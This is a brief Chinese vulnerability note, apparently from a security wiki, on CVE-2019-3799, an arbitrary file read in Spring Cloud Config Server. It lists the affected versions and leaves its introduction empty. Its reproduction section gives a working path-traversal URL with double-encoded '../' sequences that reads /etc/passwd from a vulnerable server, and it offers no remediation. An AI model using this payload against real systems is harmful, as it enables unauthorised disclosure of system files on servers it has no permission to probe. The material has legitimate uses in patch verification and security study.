---
title: "（CVE-2019-3799）Spring Cloud Config Server 任意文件读取"
id: zhfly3134
---

# （CVE-2019-3799）Spring Cloud Config Server 任意文件读取

## 一、漏洞简介

## 二、漏洞影响

Spring Cloud Config 2.1.0 to 2.1.1

Spring Cloud Config 2.0.0 to 2.0.3

Spring Cloud Config 1.4.0 to 1.4.5

其他不受支持的老版本 （如Spring Cloud Config1.3及其以下版本）

## 三、复现过程

```
http://www.0-sec.org/test/pathtraversal/master/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd 
```